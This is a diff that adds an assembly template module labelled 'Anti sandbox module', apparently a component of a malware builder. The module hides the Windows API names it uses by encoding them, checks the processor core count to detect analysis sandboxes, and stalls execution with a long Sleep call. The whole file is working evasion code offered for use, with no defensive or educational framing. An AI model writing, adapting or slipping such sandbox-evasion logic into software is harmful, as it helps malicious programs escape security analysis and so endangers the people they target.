@@ -1,0 +1,61 @@
+#!name##AsmNinja
+#!types##sfile
+#!info##Anti sandbox module
+
+{% set PFL_base = TOOL.AsmSh_make_table(data=PF_text, set_as_default=True)%}
+
+%define NINJA_CORE_NUMBER ZAXXON_CORE_NUM    ; core check number
+%define NINJA_START_PAUSE  {{ZAX_main_pause}}    ; pause time before start
+
+section .data
+    ninja_title_gi: dd {{TOOL.AsmSh_encode("GetSystemInfo")}}    ; GetSystemInfo
+    ninja_title_pas: dd {{TOOL.AsmSh_encode("Sleep")}}    ; Sleep
+
+{% set _ = TOOL.AsmSh_reset_table() %} 
+    
+section .bss
+    ninja_player_info: resb 64 ; SYSTEM_INFO structure
+    
+section .text
+
+NINJA_prepare_player:
+; check if it is in sandbox
+; REQUIREMENTS: stack allign to 16
+; OUT: rax - 1 sandbox, 0 - pass
+    push rbp
+    mov rbp, rsp
+    sub rsp, 8
+    
+    ;check core number
+    sub rsp, 40
+    mov rcx, ninja_title_gi
+    mov rdx, 0
+    call PITF_get
+    lea rcx, ninja_player_info
+    call rax    ; call GetSystemInfo
+    add rsp, 40
+    lea rcx, [ninja_player_info]
+    mov edx, [rcx + 32] ; get core number
+    cmp edx, NINJA_CORE_NUMBER
+    jl .return_sb
+    
+    ; pause before start
+    sub rsp, 40
+    mov rcx, ninja_title_pas
+    mov rdx, 0
+    call PITF_get
+    mov rcx, NINJA_START_PAUSE
+    call rax    ; call Sleep
+    add rsp, 40
+    
+    mov rax, 0
+    
+    .return:
+        add rsp, 8
+        pop rbp
+        ret
+    
+    .return_sb:
+        mov rax, 1
+        jmp .return
+        
